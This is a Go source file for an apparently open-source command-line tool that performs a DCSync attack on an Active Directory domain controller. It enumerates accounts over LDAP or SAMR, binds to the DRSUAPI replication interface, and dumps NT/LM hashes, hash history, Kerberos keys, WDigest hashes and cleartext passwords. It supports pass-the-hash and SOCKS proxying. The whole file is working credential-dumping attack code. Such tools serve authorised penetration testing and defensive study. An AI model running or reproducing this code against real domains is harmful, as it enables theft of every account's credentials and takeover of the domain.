// MIT License
//
// # Copyright (c) 2026 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//

package main

import (
	"bufio"
	"context"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"slices"
	"sort"
	"strconv"
	"strings"
	"time"

	rundebug "runtime/debug"

	"golang.org/x/net/proxy"
	"golang.org/x/term"

	"github.com/jfjallid/go-smb/dcerpc"
	"github.com/jfjallid/go-smb/dcerpc/epm"
	"github.com/jfjallid/go-smb/dcerpc/msdrsr"
	"github.com/jfjallid/go-smb/dcerpc/mssamr"
	"github.com/jfjallid/go-smb/gss"
	"github.com/jfjallid/go-smb/ldap"
	"github.com/jfjallid/go-smb/spnego"
	"github.com/jfjallid/golog"
)

var (
	log            = golog.Get("main")
	release string = "0.1.2"
)

var helpMsg = `
    Usage: ` + os.Args[0] + ` [options]

    options:
          --host <target>          Hostname or ip address of remote DC. Must be hostname when using Kerberos
      -P, --port <int>             EPM Port (default 135)
      -d, --domain <name/fqdn>     Domain name to use for login
      -u, --user <string>          Username
      -p, --pass <string>          Password
      -n, --no-pass                Disable password prompt and send no credentials
          --hash <NT Hash>         Hex encoded NT Hash for user password
      -k, --kerberos               Use Kerberos authentication. (KRB5CCNAME will be checked on Linux)
          --dc-ip <ip>             Optionally specify ip of KDC when using Kerberos authentication
          --target-ip <ip>         Optionally specify ip of target when using Kerberos authentication
          --dns-host <ip:port>     Override system's default DNS resolver
          --dns-tcp                Force DNS lookups over TCP. Default true when using --socks-host
          --aes-key <hex>          Use a hex encoded AES128/256 key for Kerberos authentication
      -t, --timeout <duration>     Dial timeout specified in 5s, 1m, 10m format (default 5s)
          --target <DOMAIN\User>   Single target account to DCSync
          --target-file <path>     Read target accounts from file, one account per line
          --ldap-filter            LDAP filter string to select which accounts to target
          --exclude-users          Comma-separated list of users to skip when targeting all accounts
          --enabled                Filter on enabled accounts when using ldap
          --use-samr               Enumerate usernames via MS-SAMR instead of LDAP
          --history                Include NT/LM/WDigest hash history
          --ntlm-only              Only sync NTLM hashes.
          --socks-host <target>    Establish connection via a SOCKS5 proxy server
          --socks-port <port>      SOCKS5 proxy port (default 1080)
          --noenc                  Run ldap queries without encryption.
          --tls                    Run ldap over TLS port 636
          --starttls               Try to upgrade ldap to TLS on port 389
          --sasl                   SASL security: none, sign, seal (default seal)
          --cb                     Enable TLS channel binding (default false)
          --format                 Output format (impacket,default,...)
          --debug                  Enable debug logging. Bare --debug turns on every
                                   registered package; --debug=smb,dcerpc turns on only the
                                   listed package-name suffixes (the '=' form is required
                                   for the filter).
          --verbose                Enable verbose logging. Same filter syntax as --debug.
                                   --debug and --verbose may be combined with different
                                   filters; a package targeted by both gets the higher level.
          --list-log-packages      List the registered log package names that can be
                                   targeted with --debug=<suffix> or --verbose=<suffix>,
                                   then exit
      -v, --version                Show version
`

// logFlag is a comma-separated package-suffix filter that also remembers
// whether the user passed the flag at all. IsBoolFlag is set so the bare
// "--debug" and "--verbose" form parses (the flag pkg then calls Set("true"))
// — we treat "true" as "no filter, all packages on". A filter list requires
// the "=" form, e.g. --debug=smb,dcerpc, because IsBoolFlag stops the parser
// from consuming the next positional token.
type logFlag struct {
	set    bool
	values []string
}

func (d *logFlag) String() string { return strings.Join(d.values, ",") }

func (d *logFlag) IsBoolFlag() bool { return true }

func (d *logFlag) Set(s string) error {
	d.set = true
	d.values = nil
	if s == "" || s == "true" {
		return nil
	}
	for _, tok := range strings.Split(s, ",") {
		if tok = strings.TrimSpace(tok); tok != "" {
			d.values = append(d.values, tok)
		}
	}
	return nil
}

// applyLogLevel bumps registered package loggers to level. An empty filter
// matches every name returned by golog.Names(); a non-empty filter keeps only
// names whose path suffix matches one of the tokens (see matchesAny).
func applyLogLevel(level int, filter []string) {
	flags := golog.LstdFlags | golog.Lshortfile
	for _, name := range golog.Names() {
		if len(filter) == 0 || matchesAny(name, filter) {
			golog.Set(name, "", level, flags, nil, nil)
		}
	}
}

// matchesAny reports whether name equals any token or ends with "/"+token,
// so "smb" hits ".../go-smb/smb" but not ".../go-smb" (ends in "/go-smb",
// not "/smb") and not ".../smb/server" (ends in "/server").
func matchesAny(name string, tokens []string) bool {
	for _, t := range tokens {
		if name == t || strings.HasSuffix(name, "/"+t) {
			return true
		}
	}
	return false
}

// listLogPackages prints every registered log package name. The package
// loggers register themselves at import time, so golog.Names() here lists
// every logger this binary can target; the suffix of any of these names is
// what --debug=/--verbose= matches.
func listLogPackages() {
	names := golog.Names()
	sort.Strings(names)
	fmt.Println("Registered log packages (target a name's suffix with --debug=<suffix> or --verbose=<suffix>):")
	for _, name := range names {
		fmt.Println(name)
	}
}

// configureLogging applies the --debug / --verbose filters. The two are not
// mutually exclusive: each may carry its own comma-separated package filter
// (e.g. --debug=smb,dcerpc --verbose=main). Verbose is applied first and debug
// second so any package targeted by both ends up at the higher level
// (LevelDebug > LevelInfo). A bare --debug or --verbose (empty filter) targets
// every registered package, so passing both bare is ambiguous and rejected.
func configureLogging(debug, verbose logFlag) bool {
	if debug.set && verbose.set && len(debug.values) == 0 && len(verbose.values) == 0 {
		fmt.Println("Cannot enable both --debug and --verbose for all packages at once. Specify just one of them, or be more granular e.g. --debug=smb,dcerpc --verbose=main")
		return false
	}
	if verbose.set {
		applyLogLevel(golog.LevelInfo, verbose.values)
	}
	if debug.set {
		applyLogLevel(golog.LevelDebug, debug.values)
	}
	return true
}

func isFlagSet(name string) bool {
	found := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == name {
			found = true
		}
	})
	return found
}

// filetimeToString converts a Windows FILETIME (100-ns intervals since
// 1601-01-01) to a human-readable string. Returns "Never" for never/unset values.
func filetimeToString(ft uint64) string {
	if ft == 0 || ft == 0x7FFFFFFFFFFFFFFF {
		return "Never"
	}
	const epochDiff = 116444736000000000
	if ft < epochDiff {
		return "Never"
	}
	unixNano := (ft - epochDiff) * 100
	return time.Unix(0, int64(unixNano)).UTC().Format("2006-01-02 15:04:05 UTC")
}

// discoverSAMREndpoint queries the Endpoint Mapper on port 135 for the
// TCP bindings of the SAMR interface, using the provided dial function so
// that a SOCKS proxy (when configured) is honored.
func discoverSAMREndpoint(host string, port int, dial func(addr string) (net.Conn, error)) (rpcConn net.Conn, err error) {
	epmConn, err := dial(net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		return nil, fmt.Errorf("failed to connect to EPM: %v", err)
	}
	transport := dcerpc.NewTCPTransport(epmConn)
	defer transport.Close()

	sb, err := dcerpc.Bind(transport, epm.MSRPCUuidEpm, epm.MSRPCEpmMajorVersion, epm.MSRPCEpmMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		return nil, fmt.Errorf("failed to bind to EPM: %v", err)
	}

	rpcCon := epm.NewRPCCon(sb)
	bindings, err := rpcCon.GetTCPPortForInterface(mssamr.MSRPCUuidSamr, mssamr.MSRPCSamrMajorVersion, mssamr.MSRPCSamrMinorVersion)
	if err != nil {
		return nil, err
	}

	for i := range bindings {
		if bindings[i].Host == "" || bindings[i].Host == "0.0.0.0" {
			bindings[i].Host = host
		}
	}
	if len(bindings) == 0 {
		err = fmt.Errorf("EPM returned no bindings for SAMR")
		return
	}

	log.Infof("[*] Connecting to DRSUAPI at %s...\n", bindings[0].String())

	for i := range bindings {
		rpcConn, err = dial(bindings[i].String())
		if err == nil {
			break
		} else {
			log.Debugf("TCP connect to SAMR failed for %s with error: %v\n", bindings[i].String(), err)
		}
	}
	if err != nil {
		err = fmt.Errorf("TCP connect to SAMR failed: %v", err)
		return
	}
	return
}

// discoverDRSUAPIEndpoint queries the Endpoint Mapper on port 135 for the
// TCP bindings of the DRSUAPI interface, using the provided dial function so
// that a SOCKS proxy (when configured) is honored.
func discoverDRSUAPIEndpoint(host string, port int, dial func(addr string) (net.Conn, error)) (rpcConn net.Conn, err error) {
	epmConn, err := dial(net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		return nil, fmt.Errorf("failed to connect to EPM: %v", err)
	}
	transport := dcerpc.NewTCPTransport(epmConn)
	defer transport.Close()

	sb, err := dcerpc.Bind(transport, epm.MSRPCUuidEpm, epm.MSRPCEpmMajorVersion, epm.MSRPCEpmMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		return nil, fmt.Errorf("failed to bind to EPM: %v", err)
	}

	rpcCon := epm.NewRPCCon(sb)
	bindings, err := rpcCon.GetTCPPortForInterface(msdrsr.MSRPCUuidDrsuapi, msdrsr.MSRPCDrsuapiMajorVersion, msdrsr.MSRPCDrsuapiMinorVersion)
	if err != nil {
		return nil, err
	}

	for i := range bindings {
		if bindings[i].Host == "" || bindings[i].Host == "0.0.0.0" {
			bindings[i].Host = host
		}
	}
	if len(bindings) == 0 {
		err = fmt.Errorf("EPM returned no bindings for DRSUAPI")
		return
	}

	log.Infof("[*] Connecting to DRSUAPI at %s...\n", bindings[0].String())

	for i := range bindings {
		rpcConn, err = dial(bindings[i].String())
		if err == nil {
			break
		} else {
			log.Debugf("TCP connect to DRSUAPI failed for %s with error: %v\n", bindings[i].String(), err)
		}
	}
	if err != nil {
		err = fmt.Errorf("TCP connect to DRSUAPI failed: %v", err)
		return
	}
	return
}

func saslSecurityFromArgs(mode string) ldap.SASLMode {
	switch strings.ToLower(mode) {
	case "none":
		return ldap.SASLNone
	case "sign":
		return ldap.SASLSign
	case "seal":
		return ldap.SASLSeal
	default:
		return ldap.SASLSeal
	}
}

func main() {
	var host, username, password, hash, domain, socksHost, targetIP, dcIP, aesKey, dnsHost, target, ldapFilter, excludeUsers, targetFile, format, saslModeStr string
	var port, socksPort int
	var version, noPass, kerberos, dnsTCP, useSamr, history, ntlmOnly, noenc, tls, starttls, enabled, channelBind, listLog bool
	var debug, verbose logFlag

	var err error
	var dialTimeout time.Duration
	var dialSocksProxy proxy.Dialer

	flag.Usage = func() {
		fmt.Println(helpMsg)
		os.Exit(0)
	}

	flag.StringVar(&host, "host", "", "")
	flag.StringVar(&username, "u", "", "")
	flag.StringVar(&username, "user", "", "")
	flag.StringVar(&password, "p", "", "")
	flag.StringVar(&password, "pass", "", "")
	flag.StringVar(&hash, "hash", "", "")
	flag.StringVar(&domain, "d", "", "")
	flag.StringVar(&domain, "domain", "", "")
	flag.IntVar(&port, "P", 135, "")
	flag.IntVar(&port, "port", 135, "")
	flag.Var(&debug, "debug", "")
	flag.Var(&verbose, "verbose", "")
	flag.BoolVar(&listLog, "list-log-packages", false, "")
	flag.DurationVar(&dialTimeout, "t", 5*time.Second, "")
	flag.DurationVar(&dialTimeout, "timeout", 5*time.Second, "")
	flag.BoolVar(&version, "v", false, "")
	flag.BoolVar(&version, "version", false, "")
	flag.StringVar(&socksHost, "socks-host", "", "")
	flag.IntVar(&socksPort, "socks-port", 1080, "")
	flag.BoolVar(&noPass, "no-pass", false, "")
	flag.BoolVar(&noPass, "n", false, "")
	flag.BoolVar(&kerberos, "k", false, "")
	flag.BoolVar(&kerberos, "kerberos", false, "")
	flag.StringVar(&targetIP, "target-ip", "", "")
	flag.StringVar(&dcIP, "dc-ip", "", "")
	flag.StringVar(&aesKey, "aes-key", "", "")
	flag.StringVar(&dnsHost, "dns-host", "", "")
	flag.BoolVar(&dnsTCP, "dns-tcp", false, "")
	flag.StringVar(&target, "target", "", "")
	flag.StringVar(&ldapFilter, "ldap-filter", "(&(objectClass=user))", "")
	flag.StringVar(&excludeUsers, "exclude-users", "", "")
	flag.BoolVar(&useSamr, "use-samr", false, "")
	flag.BoolVar(&history, "history", false, "")
	flag.BoolVar(&noenc, "noenc", false, "")
	flag.BoolVar(&tls, "tls", false, "")
	flag.BoolVar(&starttls, "starttls", false, "")
	flag.BoolVar(&ntlmOnly, "ntlm-only", false, "")
	flag.BoolVar(&enabled, "enabled", false, "")
	flag.StringVar(&targetFile, "target-file", "", "")
	flag.StringVar(&format, "format", "", "")
	flag.StringVar(&saslModeStr, "sasl", "seal", "")
	flag.BoolVar(&channelBind, "cb", false, "")

	flag.Parse()

	if listLog {
		listLogPackages()
		return
	}

	if !configureLogging(debug, verbose) {
		return
	}

	if version {
		fmt.Printf("Version: %s\n", release)
		bi, ok := rundebug.ReadBuildInfo()
		if !ok {
			log.Errorln("Failed to read build info to locate version imported modules")
		}
		for _, m := range bi.Deps {
			fmt.Printf("Package: %s, Version: %s\n", m.Path, m.Version)
		}
		return
	}

	if format != "" {
		switch strings.ToLower(format) {
		case "impacket":
		default:
			log.Errorf("Unknown format: %q", format)
			flag.Usage()
			return
		}
	}

	if useSamr && isFlagSet("ldap-filter") {
		log.Errorln("--use-samr and --ldap-filter flags are mutually exclusive!")
		flag.Usage()
		return
	}

	if tls && starttls {
		log.Errorln("--tls and --starttls are mutually exclusive!")
		flag.Usage()
		return
	}
	if !(tls || starttls) && channelBind {
		log.Errorln("--cb requires a TLS connection to enable channel binding")
		flag.Usage()
		return
	}

	if useSamr && enabled {
		log.Errorln("--use-samr and --enabled are mutually exclusive!")
		flag.Usage()
		return
	}

	// Validate ldap filter
	if isFlagSet("ldap-filter") {
		err = ldap.ValidateFilter(ldapFilter)
		if err != nil {
			log.Errorf("invalid ldap filter: %v", err)
			return
		}
	} else {
		if enabled {
			log.Infoln("Extending the ldap filter to only include accounts that expire at the earliest 1 hour from now")
			// Hack to add filter for accounts that
			expiryDate := ldap.TimeToFileTime(time.Now().Add(time.Hour).UTC())
			ldapFilter = fmt.Sprintf("%s(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(accountExpires=0)(accountExpires>=%d)))", strings.TrimSuffix(ldapFilter, ")"), expiryDate)
		}
	}

	if isFlagSet("dns-host") {
		parts := strings.Split(dnsHost, ":")
		if len(parts) < 2 {
			if dnsHost != "" {
				dnsHost += ":53"
				parts = append(parts, "53")
				log.Infof("No port number specified for --dns-host so assuming port 53")
			} else {
				log.Errorln("invalid --dns-host")
				flag.Usage()
				return
			}
		}
		ip := net.ParseIP(parts[0])
		if ip == nil {
			log.Errorln("invalid --dns-host. Not a valid ip host address")
			flag.Usage()
			return
		}
		p, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			log.Errorf("invalid --dns-host. Failed to parse port: %s", err)
			return
		}
		if p < 1 {
			log.Errorln("invalid --dns-host port number")
			flag.Usage()
			return
		}
	}

	if socksHost != "" && socksPort < 1 {
		log.Errorln("invalid --socks-port")
		flag.Usage()
		return
	}

	var hashBytes []byte
	var aesKeyBytes []byte

	if host == "" && targetIP == "" {
		log.Errorln("must specify a hostname or ip")
		flag.Usage()
		return
	}
	if host != "" && targetIP == "" {
		targetIP = host
	} else if host == "" && targetIP != "" {
		host = targetIP
	}

	if dialTimeout < time.Second {
		log.Errorln("valid value for the timeout is >= 1 seconds")
		return
	}

	if excludeUsers != "" && target != "" {
		log.Errorln("--exclude-users and --target arguments are mutually exclusive")
		flag.Usage()
		return
	}
	excludedUsers := strings.Split(excludeUsers, ",")
	for i := range excludedUsers {
		excludedUsers[i] = strings.TrimSpace(excludedUsers[i])
	}

	if hash != "" {
		hashBytes, err = hex.DecodeString(hash)
		if err != nil {
			log.Errorf("failed to decode hash: %s", err)
			return
		}
	}

	if aesKey != "" {
		aesKeyBytes, err = hex.DecodeString(aesKey)
		if err != nil {
			log.Errorf("failed to decode aesKey: %s", err)
			return
		}
		if len(aesKeyBytes) != 16 && len(aesKeyBytes) != 32 {
			log.Errorln("invalid keysize of AES Key")
			return
		}
	}

	if noPass {
		password = ""
		hashBytes = nil
		aesKeyBytes = nil
	} else {
		if (password == "") && (hashBytes == nil) && (aesKeyBytes == nil) {
			if !isFlagSet("p") && !isFlagSet("pass") {
				fmt.Printf("Enter password: ")
				passBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
				fmt.Println()
				if err != nil {
					log.Errorln(err)
					return
				}
				password = string(passBytes)
			}

		}
	}

	if dnsHost != "" {
		protocol := "udp"
		if dnsTCP {
			protocol = "tcp"
		}
		net.DefaultResolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{
					Timeout: dialTimeout,
				}
				return d.DialContext(ctx, protocol, dnsHost)
			},
		}
	}

	if socksHost != "" {
		dialSocksProxy, err = proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", socksHost, socksPort), nil, proxy.Direct)
		if err != nil {
			log.Errorln(err)
			return
		}
	}

	// newMech returns a fresh mechanism for a single auth context. For Kerberos
	// the underlying krb5ssp.Client (TGT session + TGS ticket cache) is created
	// once and shared across subsequent calls so we issue a single AS-REQ and
	// reuse cached TGSs across the SAMR/LDAP/DRSUAPI binds.
	var sharedKrb *spnego.KRB5Initiator
	newMech := func() gss.Mechanism {
		if kerberos {
			mech := &spnego.KRB5Initiator{
				User:        username,
				Password:    password,
				Domain:      domain,
				Hash:        hashBytes,
				AESKey:      aesKeyBytes,
				SPN:         "host/" + host,
				DCIP:        dcIP,
				DialTimeout: dialTimeout,
				ProxyDialer: dialSocksProxy,
				DnsHost:     dnsHost,
				DnsTCP:      dnsTCP,
				Host:        targetIP,
			}
			if sharedKrb != nil {
				if c, err := sharedKrb.Client(); err == nil {
					mech.SetClient(c)
				}
			} else {
				sharedKrb = mech
			}
			return mech
		}
		return &spnego.NTLMInitiator{
			User:     username,
			Password: password,
			Hash:     hashBytes,
			Domain:   domain,
		}
	}

	dial := func(addr string) (net.Conn, error) {
		if dialSocksProxy != nil {
			return dialSocksProxy.Dial("tcp", addr)
		}
		return net.DialTimeout("tcp", addr, dialTimeout)
	}

	// DCSync targets
	targets := make([]string, 0)
	if target != "" {
		targets = append(targets, target)
	} else if targetFile != "" {
		f, err := os.Open(targetFile)
		if err != nil {
			log.Errorf("failed to open file with targets: %v", err)
			return
		}
		defer f.Close()
		reader := bufio.NewReader(f)
		for {
			line, err := reader.ReadString('\n')
			if err != nil && err != io.EOF {
				log.Errorf("failed to read line from file: %v", err)
				return
			}
			line = strings.TrimSpace(line)
			if line != "" {
				targets = append(targets, line)
			}
			if err == io.EOF {
				break
			}
		}
	} else if useSamr {
		log.Infof("[*] Discovering SAMR endpoint on %s via EPM...\n", host)
		rpcConnSamr, err := discoverSAMREndpoint(targetIP, port, dial)
		if err != nil {
			log.Errorf("EPM discovery failed: %s", err)
			return
		}
		samrTransport := dcerpc.NewTCPTransport(rpcConnSamr)
		defer samrTransport.Close()

		samrBind, err := dcerpc.BindAuth(
			samrTransport,
			mssamr.MSRPCUuidSamr,
			mssamr.MSRPCSamrMajorVersion,
			mssamr.MSRPCSamrMinorVersion,
			dcerpc.MSRPCUuidNdr,
			dcerpc.RpcAuthnLevelPktPrivacy, // Only supported auth level
			newMech(),
		)
		if err != nil {
			log.Errorf("BindAuth failed for SAMR: %s", err)
			return
		}
		log.Infoln("[*] Querying SAMR endpoint for accounts")
		samrRPCCon := mssamr.NewRPCCon(samrBind)
		handle, err := samrRPCCon.SamrConnect5("")
		if err != nil {
			log.Errorln(err)
			return
		}
		defer samrRPCCon.SamrCloseHandle(handle)
		samrDomain := strings.Split(domain, ".")[0] // We want netbios domain name not dns domain
		if samrDomain == "" {
			domains, err := samrRPCCon.SamrEnumDomains(handle)
			if err != nil {
				log.Errorln(err)
				return
			}
			for _, d := range domains {
				if !strings.EqualFold(domain, "builtin") {
					samrDomain = d
					break
				}
			}
		}
		domainID, err := samrRPCCon.SamrLookupDomain(handle, samrDomain)
		if err != nil {
			log.Errorln(err)
			return
		}
		domainHandle, err := samrRPCCon.SamrOpenDomain(handle, 0, domainID)
		if err != nil {
			log.Errorln(err)
			return
		}
		defer samrRPCCon.SamrCloseHandle(domainHandle)
		users, err := samrRPCCon.SamrEnumDomainUsers(domainHandle, mssamr.UserNormalAccount, 0)
		if err != nil {
			log.Errorln(err)
			return
		}
		for _, user := range users {
			if !slices.Contains(excludedUsers, user.Name.Value) {
				targets = append(targets, fmt.Sprintf("%s\\%s", samrDomain, user.Name.Value))
			}
		}
	} else {
		log.Infoln("[*] Querying ldap server for accounts")
		ldapOpts := ldap.ClientOptions{
			InsecureSkipVerify: true,
			UseStartTLS:        starttls,
			UseTLS:             tls,
			Dialer:             dialSocksProxy,
			DialTimeout:        dialTimeout,
		}
		ldapClient := ldap.NewClient(ldapOpts)
		err = ldapClient.Connect(host, 0)
		if err != nil {
			log.Errorf("LDAP connection failed: %v", err)
			return
		}
		defer ldapClient.Close()
		saslMode := saslSecurityFromArgs(saslModeStr)
		if tls || starttls {
			saslMode = ldap.SASLNone
		}
		ldapBindOpts := ldap.BindOptions{
			SPN:            "host/" + host,
			SASLMode:       saslMode,
			ChannelBinding: channelBind,
		}
		if noenc {
			ldapBindOpts.SASLMode = ldap.SASLNone
		}
		err = ldapClient.Bind(newMech(), ldapBindOpts)
		if err != nil {
			if be, found := errors.AsType[*ldap.BindError](err); found {
				switch be.Kind {
				case ldap.BindFailureChannelBinding:
					log.Errorf("ldap channel binding required!")
				case ldap.BindFailureSigning:
					log.Errorf("ldap signing required! Use TLS or skip --noenc flag")
				case ldap.BindFailureConfidentialityRequired:
					log.Errorf("ldaps (TLS) required! Use --tls or --starttls flag")
				case ldap.BindFailureCredentials:
					if status, found := ldap.SubStatusMap[be.SubStatus]; found {
						log.Errorf("ldap bind failed: %s", status)
					} else {
						log.Errorf("ldap bind failed with invalid credentials substatus: %d", be.SubStatus)
					}
				default:
					log.Errorf("Bind failed with unclassified error: %v\n", err)
				}
			} else {
				log.Errorf("LDAP bind failed: %v", err)
			}
			return
		}
		log.Infof("Performing LDAP search using filter: %q\n", ldapFilter)
		ldapResult, err := ldapClient.Search("", ldapFilter, []string{"samaccountname"}, 0)
		if err != nil {
			log.Errorf("LDAP search failed: %v", err)
			return
		}
		for _, entry := range ldapResult.Entries {
			name := entry.GetAttributeValue("sAMAccountName")
			if name != "" {
				if !slices.Contains(excludedUsers, name) {
					targets = append(targets, entry.DN)
				}
			}
		}
	}
	if len(targets) == 0 {
		log.Errorln("Found no accounts to DCSync")
		return
	}
	log.Infof("[*] Found %d targets to DCSync\n", len(targets))

	log.Infof("[*] Discovering DRSUAPI endpoint on %s via EPM...\n", host)
	rpcConn, err := discoverDRSUAPIEndpoint(targetIP, port, dial)
	if err != nil {
		log.Errorf("EPM discovery of DRSUAPI failed: %s", err)
		return
	}

	transport := dcerpc.NewTCPTransport(rpcConn)
	defer transport.Close()

	bind, err := dcerpc.BindAuth(
		transport,
		msdrsr.MSRPCUuidDrsuapi,
		msdrsr.MSRPCDrsuapiMajorVersion,
		msdrsr.MSRPCDrsuapiMinorVersion,
		dcerpc.MSRPCUuidNdr,
		dcerpc.RpcAuthnLevelPktPrivacy,
		newMech(),
	)
	if err != nil {
		log.Errorf("BindAuth for DRUAPI failed: %s", err)
		return
	}

	rpcCon := msdrsr.NewRPCCon(bind)
	if err := rpcCon.DRSBind(); err != nil {
		log.Errorf("DRSBind failed: %s", err)
		return
	}
	defer rpcCon.DRSUnbind()

	var results []*msdrsr.ReplicatedUser
	for _, target := range targets {
		attributes := msdrsr.AttrNTLM | msdrsr.AttrKerberos | msdrsr.AttrMetadata
		if ntlmOnly {
			attributes = msdrsr.AttrNTLM
		}
		if history {
			attributes |= msdrsr.AttrHistory
		}
		result, err := rpcCon.DCSync(target, attributes)
		if err != nil {
			log.Errorf("DCSync failed for target %s: %v", target, err)
			err = nil
			continue
		}
		results = append(results, result)
	}

	if format == "impacket" {
		var kerberosResults strings.Builder
		fmt.Println(`[*] Dumping Domain Credentials (uid:rid:lmhash:nthash)`)
		for _, result := range results {
			rid := result.ObjectSID[strings.LastIndex(result.ObjectSID, "-")+1:]
			accountStatus := "Enabled"
			if result.UserAccountControl&0x2 == 0x2 {
				accountStatus = "Disabled"
			}
			lmHash := "aad3b435b51404eeaad3b435b51404ee"
			ntHash := "7903a0de258a921f09f205ab08cd2ef2"
			if result.LMHash != nil {
				lmHash = hex.EncodeToString(result.LMHash)
			}
			if result.NTHash != nil {
				ntHash = hex.EncodeToString(result.NTHash)
			}
			if enabled {
				fmt.Printf("%s:%s:%s:%s:::\n", result.SAMAccountName, rid, lmHash, ntHash)
			} else {
				fmt.Printf("%s:%s:%s:%s::: (status=%s)\n", result.SAMAccountName, rid, lmHash, ntHash, accountStatus)
			}
			if result.SupplementalCreds != nil {
				for _, sc := range result.SupplementalCreds.KerberosKeys {
					fmt.Fprintf(&kerberosResults, "%s:%s:%x\n", result.SAMAccountName, sc.KeyTypeName, sc.KeyValue)

				}
			}
		}
		if kerberosResults.Len() != 0 {
			fmt.Println("[*] Kerberos keys grabbed")
			fmt.Println(kerberosResults.String())
		}
	} else {
		for _, result := range results {
			fmt.Println("#############################")
			fmt.Printf("SAMAccountName:     %s\n", result.SAMAccountName)
			if result.UserPrincipalName != "" {
				fmt.Printf("UserPrincipalName:  %s\n", result.UserPrincipalName)
			}
			fmt.Printf("SID:                %s\n", result.ObjectSID)
			if result.DN != "" {
				fmt.Printf("DN:                 %s\n", result.DN)
			}
			if result.UserAccountControl != 0 {
				fmt.Printf("UserAccountControl: 0x%08x\n", result.UserAccountControl)
			}
			if result.PwdLastSet != 0 {
				fmt.Printf("PwdLastSet:         %s\n", filetimeToString(result.PwdLastSet))
			}
			if result.AccountExpires != 0 {
				fmt.Printf("AccountExpires:     %s\n", filetimeToString(result.AccountExpires))
			}
			if len(result.NTHash) > 0 {
				fmt.Printf("NT Hash:            %x\n", result.NTHash)
			}
			if len(result.LMHash) > 0 {
				fmt.Printf("LM Hash:            %x\n", result.LMHash)
			}
			if history {
				for i, h := range result.NTHashHistory {
					fmt.Printf("NT History [%d]:     %x\n", i, h)
				}
				for i, h := range result.LMHashHistory {
					fmt.Printf("LM History [%d]:     %x\n", i, h)
				}
			}
			if result.SupplementalCreds != nil {
				sc := result.SupplementalCreds
				for _, k := range sc.KerberosKeys {
					fmt.Printf("Kerberos Key (%s): %x\n", k.KeyTypeName, k.KeyValue)
				}
				if sc.ClearTextPassword != "" {
					fmt.Printf("Cleartext Password: %s\n", sc.ClearTextPassword)
				}
				if len(sc.WDigestHashes) > 0 {
					if history {
						for i, h := range sc.WDigestHashes {
							fmt.Printf("WDigest Hash [%02d]: %x\n", i, h)
						}
					} else {
						fmt.Printf("WDigest Hash: %x\n", sc.WDigestHashes[0])
					}
				}
			}
		}
	}
}
